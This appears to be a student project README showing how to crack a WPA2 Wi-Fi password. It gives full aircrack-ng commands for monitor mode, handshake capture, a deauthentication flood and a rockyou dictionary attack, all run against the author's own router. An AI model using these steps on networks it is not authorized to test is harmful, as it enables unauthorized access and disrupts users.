# R-2_Repo_Fall_2025
Link to the demo video: https://youtu.be/0b4BwDmMy_w

This is a demonostration on how to crack a Wi-Fi netowrk's password. The tools used to steal the password is a demonstration of reconassiance on a potential victim to gather information and discovery of how to get into the internal network zone. 

It aims to demonostrate on how to get the password and crack it. It is meant to show people how easy it is and that they should have strong passwords, even on their Router. If a threat actor steals the password and can get in the internal network, they can do further enumeration to gather victim information via network traffic, steal private information, get into other devices connected, and even implement malware. It is a gateway for an attacker to get into the network and do all sorts of cybercrime.

People tend to not think of having strong network passwords because they think an attacker won't target them because they have nothing to offer. Also, they think an attacker has to be close to the area to crack their password. Also, people do not like entering long, complicated passwords everytime to authetnicate a new device to their network.

# Tools required

In this project, you can use a Wi-Fi adapter to scan nearby networks, unathenticate devices to it, capture the 4-way handshake that contains the unique signature of a device, and use a wordlist for a dictionary attack to crack the password.

For this project, you need the following tools: Wi-Fi adapter that supports packet injection and monitoring mode. It needs to be compatible with both Windows and Kali Linux. 

I will be using the Panda Wireless: https://www.amazon.com/gp/product/B00762YNMG/ref=ewc_pr_img_1?smid=A1K5RDMQ6V4659&psc=1

If you are running Kali natively, it only needs to work on Kali. If running Kali on a virtual machine, it needs to work on both. You are going to need a Linux OS, specifically the Kali flavor. The aircrack-ng suite. Finally, a router that is running WPA2. I will be using a TP-Link router.

Install aircrack-ng suite if not already on your Kali machine:

sudo apt install aircrack-ng

Have a wordlist of your choice ready to use. I will be using the rockyou.txt wordlist. Unzip the file if not already.

sudo gunzip /usr/share/wordlists/rockyou.txt.gz 

# Adapter set up

To set up, plug in the Wi-Fi adapter into your USB port. Open virtual box and go to settings on the Kali Linux VM. Make sure the check enable USB controller and USB 2.0 (OHCI + EHCI) controller. Click on the green check mark and add "Ralink 802.11 n WLAN". Once logged in on the VM, unplug the adapter and plug it back in. Run "ip addr" and you should a new interface for the adapter.

# Execution

See what network interfaces are on the Kali machine. You should see wlan0 for your adapter in the DOWN state.

ip addr

Kill any processes that could interfere with Wi-Fi adapter with monitoring mode. For example, the wpa_supplicant process.

sudo airmon-ng check kill

Start the Wi-Fi adapter interface in monitor mode. Your interface should change from wlan0 to wlan0mon.

sudo airmon-ng start wlan0 

Verify that monitor mode is running on wlan0.

sudo airmon-ng

See all nearby available networks and get the routers's MAC address and channel. Once your target is found and got the BSSID and Channel number, press "Ctrl+c" to stop.

sudo airodump-ng wlan0mon

Test to see device connectivity with the router by authenticating to it using your phone or another device. 

sudo airodump-ng wlan0mon -d 60:83:E7:0B:47:62

1st terminal, replace the channel number and BSSID with your own Router's info. Replace hack1 with your desired file name for the capture. Focus the adapter on your target and capture the 4-way handshake. -c is the channel, --bssid is the MAC address of the target router, -w is the option to output the file to save the handshake. Once a handshake is captured and you exit the process, you should see a .cap file in your current working directory.

sudo airodump-ng -w hack1 -c 3 --bssid 60:83:E7:0B:47:62 wlan0mon

2nd terminal, replace the BSSID with your own Router's. This forces devices to disconnect to the router. When they reconnect, the handhsake is captured. In the 1st terminal, when a device authenticates, you should see, "WPA Handshale: [BSSID]" appear in the upper right hand corner.

sudo aireplay-ng --deauth 0 -a 60:83:E7:0B:47:62 wlan0mon

Use Wireshark to open the captured file. In message 2, you should the devices unique signature, MIC, in the packet. This is needed to crack the password. 

wireshark hack1-01.cap

Stop monitor mode for the wlan0 interface.

airmon-ng stop wlan0mon

Crack the file with rockyou.txt. Replace hack1-01.cap with your file name. If the password is in the wordlist, the output should say, "KEY FOUND! [ The cracked password ]".

aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt 
